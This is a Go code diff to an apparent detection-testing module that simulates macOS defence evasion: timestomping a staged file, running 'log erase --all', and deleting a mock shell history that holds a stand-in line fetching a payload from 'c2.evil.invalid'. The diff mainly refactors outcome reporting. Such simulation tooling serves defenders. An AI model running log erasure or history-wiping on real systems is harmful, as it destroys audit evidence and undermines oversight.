@@ -55,7 +55,7 @@ func (e *evadeLogClear) CheckPrereqs(ctx context.Context, params module.Params) 
 // and is cross-platform testable unlike touch -t.
 func timestomp(info module.ModuleInfo, target string) module.TelemetryEvent {
 	if err := os.WriteFile(target, []byte("macnoise timestomp target\n"), 0o644); err != nil {
-		ev := output.NewEvent(info, "file_timestomp", false,
+		ev := output.NewEvent(info, "file_timestomp", module.OutcomeError, module.File(target),
 			fmt.Sprintf("failed to create timestomp target: %s", target))
 		return output.WithError(ev, err)
 	}
@@ -63,7 +63,7 @@ func timestomp(info module.ModuleInfo, target string) module.TelemetryEvent {
 	past := time.Date(2000, 1, 1, 0, 0, 0, 0, time.UTC)
 	err := os.Chtimes(target, past, past)
 	if err != nil {
-		ev := output.NewEvent(info, "file_timestomp", true,
+		ev := output.NewEvent(info, "file_timestomp", module.OutcomeDenied, module.File(target),
 			fmt.Sprintf("timestomp denied: %s", target))
 		ev = output.WithOutcome(ev, module.OutcomeDenied, err)
 		return output.WithDetails(ev, map[string]any{
@@ -73,7 +73,7 @@ func timestomp(info module.ModuleInfo, target string) module.TelemetryEvent {
 		})
 	}
 
-	ev := output.NewEvent(info, "file_timestomp", true,
+	ev := output.NewEvent(info, "file_timestomp", module.OutcomeExecuted, module.File(target),
 		fmt.Sprintf("timestomped %s to %s", target, past.Format("2006-01-02")))
 	return output.WithDetails(ev, map[string]any{
 		"path":         target,
@@ -87,7 +87,8 @@ func timestomp(info module.ModuleInfo, target string) module.TelemetryEvent {
 func logErase(ctx context.Context, info module.ModuleInfo) module.TelemetryEvent {
 	out, err := exec.CommandContext(ctx, "log", "erase", "--all").CombinedOutput()
 	if err != nil {
-		ev := output.NewEvent(info, "log_erase_attempt", true,
+		ev := output.NewEvent(info, "log_erase_attempt", module.OutcomeDenied,
+			module.Process("log", "/usr/bin/log", "log erase --all", 0),
 			"log erase --all denied (expected without root)")
 		ev = output.WithOutcome(ev, module.OutcomeDenied, err)
 		return output.WithDetails(ev, map[string]any{
@@ -97,7 +98,8 @@ func logErase(ctx context.Context, info module.ModuleInfo) module.TelemetryEvent
 		})
 	}
 
-	ev := output.NewEvent(info, "log_erase_attempt", true,
+	ev := output.NewEvent(info, "log_erase_attempt", module.OutcomeExecuted,
+		module.Process("log", "/usr/bin/log", "log erase --all", 0),
 		"log erase --all succeeded")
 	return output.WithDetails(ev, map[string]any{
 		"command":   "log erase --all",
@@ -112,14 +114,14 @@ func logErase(ctx context.Context, info module.ModuleInfo) module.TelemetryEvent
 func clearHistory(info module.ModuleInfo, stageDir string) module.TelemetryEvent {
 	histFile := filepath.Join(stageDir, ".zsh_history")
 	if err := os.WriteFile(histFile, []byte("echo secret-command\ncurl http://c2.evil.invalid/payload\n"), 0o600); err != nil {
-		ev := output.NewEvent(info, "history_clear", false,
+		ev := output.NewEvent(info, "history_clear", module.OutcomeError, module.File(histFile),
 			fmt.Sprintf("failed to create mock history: %s", histFile))
 		return output.WithError(ev, err)
 	}
 
 	err := os.Remove(histFile)
 	if err != nil {
-		ev := output.NewEvent(info, "history_clear", true,
+		ev := output.NewEvent(info, "history_clear", module.OutcomeDenied, module.File(histFile),
 			fmt.Sprintf("mock history removal denied: %s", histFile))
 		ev = output.WithOutcome(ev, module.OutcomeDenied, err)
 		return output.WithDetails(ev, map[string]any{
@@ -128,7 +130,7 @@ func clearHistory(info module.ModuleInfo, stageDir string) module.TelemetryEvent
 		})
 	}
 
-	ev := output.NewEvent(info, "history_clear", true,
+	ev := output.NewEvent(info, "history_clear", module.OutcomeExecuted, module.File(histFile),
 		fmt.Sprintf("mock history cleared: %s", histFile))
 	return output.WithDetails(ev, map[string]any{
 		"path":      histFile,
@@ -149,23 +151,25 @@ func (e *evadeLogClear) Generate(ctx context.Context, params module.Params, emit
 		return ctx.Err()
 	default:
 	}
-	emit(timestomp(info, filepath.Join(stageDir, "timestomp_target")))
+	if err := emit(timestomp(info, filepath.Join(stageDir, "timestomp_target"))); err != nil {
+		return err
+	}
 
 	select {
 	case <-ctx.Done():
 		return ctx.Err()
 	default:
 	}
-	emit(logErase(ctx, info))
+	if err := emit(logErase(ctx, info)); err != nil {
+		return err
+	}
 
 	select {
 	case <-ctx.Done():
 		return ctx.Err()
 	default:
 	}
-	emit(clearHistory(info, stageDir))
-
-	return nil
+	return emit(clearHistory(info, stageDir))
 }
 
 func (e *evadeLogClear) DryRun(params module.Params) []string {
